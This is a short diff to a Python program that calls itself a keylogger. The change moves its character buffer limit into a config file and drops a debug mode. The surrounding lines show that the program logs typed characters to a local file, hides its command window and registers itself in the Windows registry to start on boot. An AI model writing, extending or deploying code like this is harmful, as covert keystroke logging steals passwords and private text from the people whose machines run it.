@@ -15,8 +15,6 @@ from winreg import SetValueEx, OpenKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_S
 book_path = 'myBook'
 # Buffer for characters
 line_buffer = ''
-# Buffer Size limit 
-CHAR_LIMIT = 20
 # Config File
 CONFIG_FILE = 'keylogger-config.json'
 # Name of The Logger (Be carefull changeing this may results in unremoveable registered autostart)
@@ -106,7 +104,7 @@ def log_local():
 def log_it():
     global line_buffer, config
     if config["mode"] == "local":
-        if len(line_buffer) >= CHAR_LIMIT:
+        if len(line_buffer) >= config["buffer-size"]:
             log_local()
     return True
 
@@ -174,10 +172,6 @@ if __name__ == '__main__':
     # Hide comand prompt
     if config["hide"]:
         hide()
-
-    # Debug mode Write single characters 
-    if config["mode"] == 'debug':
-        CHAR_LIMIT = 1
 
     # Add to startup
     if config["auto-start"]:
